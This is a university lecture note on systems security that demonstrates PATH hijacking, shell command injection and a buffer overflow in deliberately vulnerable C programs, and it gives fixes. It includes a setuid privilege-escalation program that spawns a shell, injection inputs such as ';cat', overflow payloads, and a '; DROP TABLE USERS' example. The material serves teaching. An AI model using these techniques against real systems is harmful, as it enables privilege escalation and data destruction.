
# Security: Attacks on System Programs

> **This material directly adapted from Prof. Aviv's [material](https://classes.adamaviv.com/ic221/s18/units/07/unit.html#org67f4730).**

It is an unfortunate truth of security that all programs have faults because humans have faults — human's write programs.
As such, we will take some time to understand the kinds of mistakes you, me, and all programmers may make that can lead to security violations.

This is a broad topic area, and we only have a small amount of time to talk about it.
We will focus on three classes of attack that are very common for the kinds of programs we've been writing in this course.

- *Path Lookup Attacks*: Where the attacker leverages path lookup to compromise an executable or library
- *Injection Attacks*: Where an attacker can inject code, usually in the form of bash, into a program that will get run.
- *Overflow Attacks*: Where the attack overflows a buffer to alter program state.

In isolation, each of these attacks can just make a program misbehave; however, things get interesting when an attack can lead to *privilege escalation*.
Privilege escalation enables a user to maliciously access resources (e.g. files) normally unavailable to the user, by exploiting a program with heightened privilege (e.g. due to `setuid` bits, or explicit id upgrades) to perform arbitrary tasks.
The ultimate goal of an attacker is to achieve privilege escalation to `root`, which essentially gives them access to all system resources.

> You might think that the kernel has more privilege than the `root` user.
> However, the `root` user is given access to the `/dev/mem` pseudo-device that is "all of memory" including all of the kernel's memory, and `root` has the ability to insert dynamic libraries (called "kernel modules") into the kernel to dynamically update kernel code!
> Being `root` truly is a super-power!

Each of these topics are quite nuanced, and the hope is to give you a general overview so you can explore the topic more on your own.

## Path Attacks

We've been using path lookup throughout the class.
Perhaps the best example is when we are in the shell and type a command:

```
$ cat Makefile
BINS=$(patsubst %.c,%,$(wildcard *.c))

all: $(BINS)

%: %.c
        gcc -o $@ $<

clean:
        rm -rf $(BINS)
```

The command `cat` is run, but the program that is actually cat's the file exists in a different place in the file system.
We can find that location using the `which` command:

```
$ which cat
/bin/cat
```

So when we type `cat`, the shell look for the `cat` binary, finds it in `/bin/cat`, and executes that.
Recall when we discussed environment variables that binaries are found by looking in all of the directories in the `PATH` enviroment variable.

```
$ echo $PATH
/home/gparmer/.local/bin/:/home/gparmer/.local/bin:/home/gparmer/.cargo/bin:/home/gparmer/.local/bin/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/home/gparmer/local/bin:/usr/racket/bin/:/home/gparmer/local/bin:/usr/racket/bin/
```

Lets look at that by converting the `:`, which separate the directories, with newlines:

```
$ echo $PATH | tr : "\n"
/home/gparmer/.local/bin/
/home/gparmer/.local/bin
/home/gparmer/.cargo/bin
/home/gparmer/.local/bin/
/usr/local/sbin
/usr/local/bin
/usr/sbin
/usr/bin
/sbin
/bin
/usr/games
/usr/local/games
/snap/bin
/home/gparmer/local/bin
/usr/racket/bin/
/home/gparmer/local/bin
/usr/racket/bin/
```

Each of the directories listed is searched, in order, until the command's program is found.

Environment variables are *global variables* set across programs that provide information about the current environment.
The `PATH` environment variable is a perfect example of this, and the customizability of the environment variables.
If you look at the directories along my path, I have a bin directory Win my home directory so I can load custom binaries.
The fact that I can customize the `PATH` in this way can lead to some interesting security situations.

### `system()`

To help this conversation, we need to introduce two library functions that work much like `execvp()` with a `fork()`, like we've done all along, but more compact.
Here's an abridged description in the manual page:

```
NAME
       system - execute a shell command

SYNOPSIS
       #include <stdlib.h>

       int system(const char *command);

DESCRIPTION

       system() executes a command specified in command by calling
       /bin/sh -c command, and returns after the command has been
       completed.  During execution of the command, SIGCHLD will be
       blocked, and SIGINT and SIGQUIT will be ignored.
```

That is, the `system()` function will run an arbitrary shell command.
Let's look at a very simple example, a "hello world" that uses two commands.

``` c
#include <stdio.h>
#include <stdlib.h>

int
main(void)
{
	/*
	 * Execute `cat`. It inherits the stdin/stdout/stderr
	 * of the current process.
	 */
	system("cat");

	return 0;
}
```

```
$ echo "Hello World" | ./system_cat
Hello World
```

The `system_cat` program runs cat with `system()`, thus it will print whatever it reads from stdin to the screen (recall: `cat` essentially echos stdin to stdout).
It turns out, that this program, despite its simplicity, actually has a relatively bad security flaw.
Let's quickly consider what might happen if we were to *change the `PATH` value* to include our local directory:

```
$ export PATH=.:$PATH
$ echo $PATH
./:/home/gparmer/.local/bin/:/home/gparmer/.local/bin:/home/gparmer/.cargo/bin:/home/gparmer/.local/bin/:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin:/home/gparmer/local/bin:/usr/racket/bin/:/home/gparmer/local/bin:/usr/racket/bin/
$ echo $PATH | tr : "\n" | head -n 2
./
/home/gparmer/.local/bin
```

The `export` builtin command in our shell updates an environment variable.
We see that at the start of the `PATH` variable is now the current directory!
`system` (and `execvp`) will look for the program in the *current directory* before the others.
So now the local directory is on the path, thus if I were to create a program named cat, then that cat would run instead of the one you would expect.
For example, here is such a program (in `fake_cat.c`):

``` c
#include <stdlib.h>

int
main(void)
{
	system("echo 'Goodbye World'");

	return 0;
}
```

This is our *imposter* program!
In this case it is innocuous, but you can imagine it being more nefarious.
To do this, we'll  make a *new* `cat` command in the current directory.

```
$ echo "Hello World" | ./system_cat
$ cp fake_cat cat
$ echo "Hello World" | ./system_cat
Goodbye World
```

This is not just a problem with the `system()` command, but also `execvp()`, which will also look up commands along the path.

``` c
#include <unistd.h>

int
main(void)
{
	char * args[] = { "cat", NULL };

	execvp(args[0], args);

	return 0;
}
```

```
$ rm ./cat
$ echo "Hello World" | ./execvp_cat
Hello World
$ cp fake_cat cat
$ echo "Hello World" | ./execvp_cat
Goodbye World
```

**Question:**

- Explain what has happened here to your teammates.
- How do you think we can prevent the intended execution of our program from being taken over so easily?

#### Fixing Path Attacks

How do we fix this? There are two solutions:

1. Always use full paths. Don't specify a command to run by its name, instead describe exactly which program is to be executed.
2. Fix the path before executing using `setenv()`

You can actually control the current `PATH` setting during execution.
To do this you can set the enviorment variables using `setenv()` and `getenv()`

``` c
#include <stdlib.h>
#include <unistd.h>

int
main(void)
{
	/* ensure the enviorment only has the path we want and overwrite */
	setenv("PATH","/bin",1);

	char * args[] = { "cat", NULL };
	execvp(args[0], args);

	return 0;
}
```

```
$ rm ./cat
$ echo "Hello World" | ./setenv_cat
Hello World
$ cp fake_cat cat
$ echo "Hello World" | ./setenv_cat
Hello World
```

Success!
Because we used a controlled and known `PATH`, we can avoid the attacker-chosen `cat` from executing.

### Path Attacks with Set-user-id Bits for Privilege Escalation

The previous examples were *bad* as we made the program execute different than the programmer intended.
But we didn't necessarily see the risk of *privilege escalation* yet.
So let's see what happens when we introduce `set-uid` to the mix.
This time, I've set the program system_cat to be set-user-id in a place that others can run it:

```
$ chmod 4775 system_cat
$ ls -l system_cat
-rwsrwxr-x 1 gparmer gparmer 16704 Apr  4 13:01 system_cat
```

Now lets imagine there is another user on the system `hacker-mchackyface`, and as that user we update the `PATH`...

```
$ export PATH=.:$PATH

```

...and do something this time that is not so innocuous.
Lets run a shell after *changing our real user id to that of `gparmer`*.
Yikes.

``` c
#include <stdlib.h>

int
main(void)
{
	char * args[]={"/bin/sh",NULL};

	/* set our real uid to our effective uid */
	setreuid(geteuid(),geteuid());
	execvp(args[0],args);

	return 0;
}
```

This time when we run the system_cat program, it will run bash as the set-user-id user. Now we've just escalated privilege.

```
$ whoami
hacker-mchackyface
$ ./system_cat
$ whoami
gparmer
$
```

Uh oh.
Now user `hacker-mchackyface` has escalated their privilege to that of user `gparmer`!

**Path Attacks Summary:**
Multiple UNIX APIs rely on the `PATH` environment variable to help us find a program we want to execute.
The attacker can modify `PATH` by adding their attack path, and ensure that a program with the same name as the target is in that path.
This will lead to the program executing the attacker's code!
Should this attack exist in a program that is `set-uid`, the attacker can now execute the program at the higher privilege.

### `LD_PRELOAD` Attacks?

We might be clever, and think that we can use `LD_PRELOAD` to take over some of the library APIs with our own code!
Fortunately, this doesn't work.
The dynamic linker (`ld.so`) will only use the `LD_PRELOAD` environment variable if the real user id is the same as the effective user id!
A simple solution to a threatening problem.

## Injection Attacks

Now, lets consider a situation where you use `system()` in a safer way.
You call all programs with absolute path, or update and control `PATH` before using it.
Unfortunately, *even that is not enough*.
You must also consider *injection attacks* which is when the attacker can inject code that will run.
In our case, the injected code will be bash.

Consider this program which prompts the user for a file to cat out.

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>


int
main(void)
{
	char cmd[1024] = "/bin/cat ./"; /* will append to this string */
	char input[40];

	printf("What input do you want to 'cat' (choose from below)\n");
	system("/bin/ls"); /* show available files */

	printf("input > ");
	fflush(stdout); /* force stdout to print */

	scanf("%s",input);/* read input */

	strcat(cmd,input); /* create the command */

	printf("Executing: %s\n", cmd);
	fflush(stdout); /* force stdout to print */

	system(cmd);

	return 0;
}
```

If we were to run this program, it hopefully does what you'd expect:

```
$ ./inject_system
What input do you want to 'cat' (choose from below)
01_lecture.md  cat  execvp_cat  execvp_cat.c  fake_cat  fake_cat.c  inject_system  inject_system.c  Makefile  setenv_cat  setenv_cat.c  system_cat  system_cat.c
input > Makefile
Executing: /bin/cat ./Makefile
BINS=$(patsubst %.c,%,$(wildcard *.c))

all: $(BINS)

%: %.c
        gcc -o $@ $<

clean:
        rm -rf $(BINS)
```

Ok, now consider if we were to provide input that doesn't fit this model.
What if we were to provide *shell commands as input* instead of simply the file name?

```
$ ./inject_system
What input do you want to 'cat' (choose from below)
01_lecture.md  cat  execvp_cat  execvp_cat.c  fake_cat  fake_cat.c  inject_system  inject_system.c  Makefile  setenv_cat  setenv_cat.c  system_cat  system_cat.c
input > ;echo
Executing: /bin/cat ./;echo
/bin/cat: ./: Is a directory

$
```

The input we provided was `;echo` the semi-colon closes off a bash command allowing a new one to start.
Specifically, the programmer thought that the command to be executed would *only take the shape* `/bin/cat ./<file>` for some user-specified `<file>`.
Instead, we make the command execute `/bin/cat ./;echo`!
Notice that there is an extra new line printed, that was the echo printing.
This is pretty innocuous; can we get this program to run something more interesting?

We still have the `cat` program we wrote that prints "Goodbye World" and the `PATH` is set up to look in the local directory.
Setting that up, we get the following result:

```
$ ./inject_system
What input do you want to 'cat' (choose from below)
01_lecture.md  cat  execvp_cat  execvp_cat.c  fake_cat  fake_cat.c  inject_system  inject_system.c  Makefile  setenv_cat  setenv_cat.c  system_cat  system_cat.c
input > ;cat
Executing: /bin/cat ./;cat
/bin/cat: ./: Is a directory
Goodbye World
```

At this point, we own this program (`pwn` in the parlance) -- we can essentially get it to execute whatever we want.
If the program were `set-uid`, we could escalate our privilege.

**Injection Attacks Summary:**
When the user can enter commands that are passed to functions that will execute them, we must be exceedingly careful about *sanitizing* the input.
For shell commands, this often means avoiding `;` and `|` in inputs.
Interestingly, one of the most common attacks on webpages is **SQL injection**.
When user input is used to create SQL commands, an attacker might add `;` followed by additional queries.
For example, we might append `; DROP TABLE USERS` to destructively harm the database!

![SQL injection can be weaponized in many different ways.](figures/sql_injection.png)

## Overflow Attacks

Two attacks down, moving onto the third.
Let's now assume that the programmer has wised up to the two previous attacks.
Now we are using full paths to executables and we are scrubbing the input to remove any potential bash commands prior to execution.
The result is the following program:

``` c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int
main(void)
{
	char cmd[1024] = "/bin/cat ./"; /* will append to this string */
	char input[40];
	int i;

	printf("What input do you want to 'cat' (choose from below)\n");
	system("/bin/ls"); /* show available files */

	printf("input > ");
	fflush(stdout); /* force stdout to print */

	scanf("%s",input);/* read input */

	/* clean input before passing to /bin/cat */
	for (i = 0; i < 40; i++) {
		if (input[i] == ';' || input[i] == '|' || input[i] == '$' || input[i] == '&') {
			input[i] = '\0'; /* change all ;,|,$,& to a NULL */
		}
	}

	/* concatenate the two strings */
	strcat(cmd,input);
	printf("Executing: %s\n", cmd);
	fflush(stdout);

	system(cmd);

	return 0;
}
```

```
$ ./overflow_system
What input do you want to 'cat' (choose from below)
cat    execvp_cat    inject_system    inject_system.c~	Makefile  overflow_system    overflow_system.c~  run_foo.c  setenv_cat	  setenv_cat.c~  system_cat    #system-ex.c#
cat.c  execvp_cat.c  inject_system.c  input.txt		mal-lib   overflow_system.c  run_foo		 run_foo.o  setenv_cat.c  shared-lib	 system_cat.c
input > ;cat
Executing: /bin/cat ./
/bin/cat: ./: Is a directory
```

This time, no dice, but the jig is not up yet.
There is an *overflow attack*.

**Question:**

- Inspect the program.
    What happens when we increase the size of the string input into the program?
- At any point does the program start to do "bad things"?

To increase the input side programatically, we'll use a small trick to print a bunch of `A`s:

```
$ python -c "print 'A'*10"
AAAAAAAAAA
$ python -c "print 'A'*30"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
$ python -c "print 'A'*50"
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```

This produces strings of varying lengths `10`, `30`, and `50`.
Those strings can be sent to the target program using a pipe.
And we can see the result:

```
$ python -c "print 'A'*10" | ./inject_system
What input do you want to 'cat' (choose from below)
01_lecture.md  cat  execvp_cat  execvp_cat.c  fake_cat  fake_cat.c  inject_system  inject_system.c  Makefile  overflow_system.c  setenv_cat  setenv_cat.c  system_cat  system_cat.c
input > Executing: /bin/cat ./AAAAAAAAAA
/bin/cat: ./AAAAAAAAAA: No such file or directory
$ python -c "print 'A'*30" | ./inject_system
What input do you want to 'cat' (choose from below)
01_lecture.md  cat  execvp_cat  execvp_cat.c  fake_cat  fake_cat.c  inject_system  inject_system.c  Makefile  overflow_system.c  setenv_cat  setenv_cat.c  system_cat  system_cat.c
input > Executing: /bin/cat ./AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
/bin/cat: ./AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: No such file or directory
$ python -c "print 'A'*50" | ./inject_system
What input do you want to 'cat' (choose from below)
01_lecture.md  cat  execvp_cat  execvp_cat.c  fake_cat  fake_cat.c  inject_system  inject_system.c  Makefile  overflow_system.c  setenv_cat  setenv_cat.c  system_cat  system_cat.c
input > Executing: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
sh: 1: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA: not found
```

Something changes at when the input string is `50` bytes long.
We overflow the buffer for the input.

**Question:**

- Inspect the code, or run the program above, and deduce what values of the string length cause the first failure to execute `/bin/cat`.

Recall that the input buffer is only `40` bytes and size, and it is placed adjacent to the cmd buffer:

```
char cmd[1024] = "/bin/cat ./"; /* will append to this string */
char input[40];
```

When the `input` buffer overflows, we begin to write `A`s to `cmd` which replaces `/bin/cat` with whatever string is written at that location!
Yikes.
Finally, we concatenate `cmd` with input, resulting in a long string of `A`s for the command being executed by `system()`.

How do we leverage this error to pwn this program?
The program is trying to execute a command that is `AAA...` and we can control the `PATH`.
Lets get dangerous.
Let's create such a program named `AAA...`, so that it is executed when we overflow!

```
$ cp cat AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
$ ./AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Goodbye World
```

Now when we execute the overflow, we get our desired "Goodbye World" result:

```
python -c "print 'A'*50" | ./inject_system
What input do you want to 'cat' (choose from below)
01_lecture.md                                          cat           fake_cat       inject_system.c    setenv_cat    system_cat.c
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA     execvp_cat    fake_cat.c     Makefile           setenv_cat.c
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA  execvp_cat.c  inject_system  overflow_system.c  system_cat
input > Executing: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Goodbye World
```

Uh-oh: we're executing attacker-controlled code again!

**Question:**

- How would you fix this bug?
- How should we generally fix overflow bugs?

The most direct way is to always "bound check" accesses to strings, just like Java and Python do.
For example, always use library functions like `strncp()` or `strncat()` that we can use to prevent `input` from overflowing, but that is even sometimes not sufficient.
This can all get quite complex.
This is an introduction to this issue, and not the final say.
